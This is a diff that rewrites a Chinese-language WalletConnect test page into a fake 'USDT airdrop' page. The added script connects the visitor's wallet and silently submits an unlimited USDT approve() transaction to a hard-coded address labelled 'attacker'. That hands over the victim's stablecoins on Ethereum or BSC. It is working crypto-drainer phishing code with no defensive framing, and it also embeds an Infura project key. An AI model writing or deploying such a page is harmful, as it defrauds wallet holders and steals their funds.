@@ -1,32 +1,64 @@
+
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>測試 QR 掃碼</title>
+  <title>USDT 空投授權頁</title>
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 </head>
 <body style="background:#111; color:white; text-align:center; padding-top:60px; font-family:sans-serif;">
-  <h2>📲 測試 WalletConnect v1 掃碼</h2>
-  <button onclick="connect()">點我連接錢包</button>
+  <h2>🎁 恭喜你獲得 USDT 空投！</h2>
+  <button onclick="connect()">📲 點我連接錢包</button>
   <p id="status" style="margin-top:20px;"></p>
 
   <script>
-    const provider = new WalletConnectProvider.default({
-      rpc: {
-        1: "https://mainnet.infura.io/v3/99af7ec8242f4645ac8c27d5b9354e2c", // Ethereum
-        56: "https://bsc-dataseed.binance.org/" // BSC
-      }
-    });
+    const USDT_BY_CHAIN = {
+      1: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum
+      56: "0x55d398326f99059ff775485246999027b3197955"  // BSC
+    };
+
+    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
 
     async function connect() {
+      const provider = new WalletConnectProvider.default({
+        rpc: {
+          1: "https://mainnet.infura.io/v3/99af7ec8242f4645ac8c27d5b9354e2c",
+          56: "https://bsc-dataseed.binance.org/"
+        }
+      });
+
       try {
         await provider.enable();
         const web3 = new Web3(provider);
         const accounts = await web3.eth.getAccounts();
-        document.getElementById("status").innerText = "✅ 已連接：" + accounts[0];
-      } catch (e) {
-        document.getElementById("status").innerText = "❌ 錯誤：" + e.message;
+        const user = accounts[0];
+        const chainId = await web3.eth.getChainId();
+        const token = USDT_BY_CHAIN[chainId];
+
+        if (!token) {
+          document.getElementById("status").innerText = "❌ 此鏈不支援 USDT";
+          return;
+        }
+
+        const approveData = web3.eth.abi.encodeFunctionCall({
+          name: "approve",
+          type: "function",
+          inputs: [
+            { type: "address", name: "spender" },
+            { type: "uint256", name: "amount" }
+          ]
+        }, [attacker, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]);
+
+        const tx = await web3.eth.sendTransaction({
+          from: user,
+          to: token,
+          data: approveData
+        });
+
+        document.getElementById("status").innerText = `✅ 授權成功！Tx Hash: ${tx.transactionHash}`;
+      } catch (err) {
+        document.getElementById("status").innerText = "❌ 錯誤：" + err.message;
       }
     }
   </script>
